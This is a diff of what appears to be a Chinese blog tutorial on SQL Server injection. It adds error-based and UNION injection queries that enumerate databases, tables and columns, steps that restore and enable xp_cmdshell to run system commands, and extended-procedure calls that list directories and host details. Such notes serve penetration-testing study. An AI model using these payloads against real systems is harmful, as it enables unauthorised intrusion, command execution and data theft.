@@ -120,20 +120,120 @@
 
 <h3 id="0x00-基础信息探测">0x00 基础信息探测</h3>
 
-<pre><code>@@version
-@@SERVERNAME
-@@SERVICENAME
-ORIGINAL_LOGIN()
-SYSTEM_USER
-SUSER_NAME()
-HOST_NAME()
-HOST_ID()
-SESSION_USER
-CURRENT_USER
-USER
-USER_NAME()
-USER_ID()
-USER_SID()
+<pre><code class="language-sql">@@VERSION,@@SERVERNAME,@@SERVICENAME;
+--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
+--WIN-2008
+--MSSQLSERVER
+
+USER,CURRENT_USER,SESSION_USER,SYSTEM_USER;
+--dbo
+--dbo
+--dbo
+--sa
+
+USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
+--dbo
+--wyb
+--46530
+--sa
+
+USER_ID(),USER_SID();
+--1
+--&lt;01&gt;
+
+ORIGINAL_LOGIN();
+--sa
+</code></pre>
+
+<h3 id="0x01-判断是否为sa权限">0x01 判断是否为sa权限</h3>
+
+<p><img src="/img/post/20180904-105516.png" alt="75" /></p>
+
+<h3 id="0x02-进行注入">0x02 进行注入</h3>
+
+<ul>
+<li><p>得到所有数据库名字
+<img src="/img/post/20180904-110306.png" alt="75" /></p>
+
+<pre><code>--报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
+select id,name from msg where id=1 and 0&lt;&gt;(select name from master.dbo.sysdatabases where dbid=7);
+</code></pre>
+
+<p><img src="/img/post/20180904-151240.png" alt="75" /></p></li>
+
+<li><p>得到数据库test的所有表名（用户创建的表xtype的值是U）
+<img src="/img/post/20180904-111912.png" alt="70" /></p></li>
+</ul>
+
+<pre><code>--得到数据库test的第一张表
+select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U';
+
+--得到数据库test的第二张表
+select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in ('article');
+</code></pre>
+
+<p><img src="/img/post/20180904-151551.png" alt="80" /></p>
+
+<ul>
+<li><p>得到数据库test的表article的所有列名（先得到article的表id，然后得到列名）
+<img src="/img/post/20180904-112859.png" alt="60" />
+<img src="/img/post/20180904-112938.png" alt="75" /></p></li>
+
+<li><p>得到数据库test的表article的数据
+<img src="/img/post/20180904-113720.png" alt="75" /></p></li>
+</ul>
+
+<h3 id="0x03-常见的sql-server扩展存储过程">0x03 常见的SQL Server扩展存储过程</h3>
+
+<ul>
+<li>执行系统命令</li>
+</ul>
+
+<pre><code class="language-sql">--判断xp_cmdshell是否被删除
+?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')
+
+--若xp_cmdshell被删除，可恢复且支持绝对路径的恢复 
+exec master..sp_addextendedproc 'xp_cmdshell','xplog70.dll';
+
+--开启xp_cmdshell
+exec sp_configure 'show advanced options',1;
+reconfigure;
+exec sp_configure 'xp_cmdshell',1;
+reconfigure;
+
+--使用xp_cmdshell执行命令
+exec master..xp_cmdshell 'whoami';
+</code></pre>
+
+<ul>
+<li>文件操作</li>
+</ul>
+
+<pre><code>#列目录、文件
+exec master..xp_dirtree 'c:\wwwroot',1 #列c:\wwwroot下的文件夹 
+exec master..xp_dirtree 'c:\wwwroot',1,1 #列c:\wwwroot下的文件夹和文件
+
+exec master..xp_subdirs 'c:\wwwroot' #列c:\wwwroot下的文件夹
+
+#显示系统可用盘符
+exec master..xp_availablemedia
+</code></pre>
+
+<ul>
+<li>主机、中间件信息</li>
+</ul>
+
+<pre><code>#获得MS SQL的版本号
+exec master..sp_msgetversion
+
+#列出服务器上所有windows本地组
+execu master..xp_enumgroups
+
+#得到当前sql server服务器的计算机名称
+exec master..xp_getnetname
+
+#服务器安全模式信息
+exec master..xp_loginconfig
 </code></pre>
 
                 
